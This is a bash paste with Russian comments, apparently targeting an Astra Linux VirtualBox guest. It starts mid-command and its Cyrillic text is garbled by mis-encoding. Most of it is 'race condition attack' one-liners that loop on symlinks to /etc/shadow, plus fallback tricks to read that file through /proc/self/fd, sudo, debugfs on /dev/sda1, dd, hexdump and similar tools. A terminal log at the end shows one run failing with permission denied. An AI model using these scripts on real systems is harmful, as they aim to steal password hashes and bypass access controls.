"–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc/self/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: $(hexdump -C /etc/shadow 2>/dev/null | head -3 || echo 'Hexdump –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: $(od -c /etc/shadow 2>/dev/null | head -3 || echo 'Od –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strings: $(strings /etc/shadow 2>/dev/null | head -3 || echo 'Strings –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ xxd: $(xxd /etc/shadow 2>/dev/null | head -3 || echo 'Xxd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/fs: $(cat /proc/fs/ext4/sda1/options 2>/dev/null | head -1 || echo 'Proc/fs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink* # –ò–ù–°–¢–†–£–ö–¶–ò–ò –î–õ–Ø VIRTUALBOX ASTRA LINUX:
# =============================================================================
# –ú–ï–ì–ê –°–£–ü–ï–† –£–õ–¨–¢–†–ê –ò–ó–û–©–†–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø –° –ú–ê–ö–°–ò–ú–ê–õ–¨–ù–´–ú–ò –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê:
# =============================================================================

echo "üöÄ –ú–ï–ì–ê –°–£–ü–ï–† –£–õ–¨–¢–†–ê –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ capabilities: $(capsh --print 2>/dev/null | head -3 || echo 'Capabilities –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ /proc: $(ls -la /proc/self/fd/ 2>/dev/null | head -3)" && echo "=== –ó–ê–ü–£–°–ö –ú–ï–ì–ê –°–£–ü–ï–† –£–õ–¨–¢–†–ê –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..100000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink3; ln -sf /etc/shadow /tmp/race_symlink3 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink3 ] && [ ! -L /tmp/race_symlink3 ]; then if head -1 /tmp/race_symlink3 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 3 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink3 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink4; ln -sf /etc/shadow /tmp/race_symlink4 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink4 ] && [ ! -L /tmp/race_symlink4 ]; then if head -1 /tmp/race_symlink4 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 4 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink4 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink5; ln -sf /etc/shadow /tmp/race_symlink5 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink5 ] && [ ! -L /tmp/race_symlink5 ]; then if head -1 /tmp/race_symlink5 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 5 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink5 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink6; ln -sf /etc/shadow /tmp/race_symlink6 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink6 ] && [ ! -L /tmp/race_symlink6 ]; then if head -1 /tmp/race_symlink6 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 6 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink6 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink7; ln -sf /etc/shadow /tmp/race_symlink7 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink7 ] && [ ! -L /tmp/race_symlink7 ]; then if head -1 /tmp/race_symlink7 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 7 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink7 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink8; ln -sf /etc/shadow /tmp/race_symlink8 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink8 ] && [ ! -L /tmp/race_symlink8 ]; then if head -1 /tmp/race_symlink8 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 8 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink8 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –ú–ï–ì–ê –°–£–ü–ï–† –£–õ–¨–¢–†–ê –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc/self/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: $(hexdump -C /etc/shadow 2>/dev/null | head -3 || echo 'Hexdump –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: $(od -c /etc/shadow 2>/dev/null | head -3 || echo 'Od –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strings: $(strings /etc/shadow 2>/dev/null | head -3 || echo 'Strings –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ xxd: $(xxd /etc/shadow 2>/dev/null | head -3 || echo 'Xxd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/fs: $(cat /proc/fs/ext4/sda1/options 2>/dev/null | head -1 || echo 'Proc/fs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/meminfo: $(cat /proc/meminfo 2>/dev/null | head -1 || echo 'Proc/meminfo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/version: $(cat /proc/version 2>/dev/null | head -1 || echo 'Proc/version –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/cmdline: $(cat /proc/cmdline 2>/dev/null | head -1 || echo 'Proc/cmdline –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/stat: $(cat /proc/stat 2>/dev/null | head -1 || echo 'Proc/stat –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink* 

# =============================================================================
# 1. –û—Ç–∫—Ä–æ–π—Ç–µ —Ç–µ—Ä–º–∏–Ω–∞–ª –≤ –≥–æ—Å—Ç–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ
# 2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–∞—á–∞–ª–∞ –≤–µ—Ä—Å–∏—é —Å –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–æ–π
# 3. –ï—Å–ª–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –≤–µ—Ä—Å–∏—é —Å sudo
# 4. –ï—Å–ª–∏ sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø—Ä–æ—Å—Ç—É—é –≤–µ—Ä—Å–∏—é
# 5. –ï—Å–ª–∏ –≤—Å–µ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –≤–æ–∑–º–æ–∂–Ω–æ /etc/shadow –∑–∞—â–∏—â–µ–Ω –æ—Ç race condition
# ============================================================================= 
user@astra:~$ echo "üöÄ RACE CONDITION –° –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò –° –û–ë–•–û–î–û–ú ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..40000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..40000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc/self/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: $(hexdump -C /etc/shadow 2>/dev/null | head -3 || echo 'Hexdump –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: $(od -c /etc/shadow 2>/dev/null | head -3 || echo 'Od –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink* # =============================================================================
[1] 305016
üöÄ RACE CONDITION –° –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê
=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: user
UID: 1001
–ì—Ä—É–ø–ø—ã: user
–ü—Ä–∞–≤–∞ /etc/shadow: -rw-r----- 1 root shadow 1168 –∞–ø—Ä 28 12:24 /etc/shadow
=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò –° –û–ë–•–û–î–û–ú ===
[1]+  –ó–∞–≤–µ—Ä—à—ë–Ω        echo "üöÄ RACE CONDITION –° –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2> /dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò –° –û–ë–•–û–î–û–ú ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && ( for i in {1..40000};
do
    rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2> /dev/null;
done )
‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!
‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å

üîç –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê:
bash: /etc/shadow: –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: 
bash: /etc/shadow: –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: bash: strace: –∫–æ–º–∞–Ω–¥–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: 


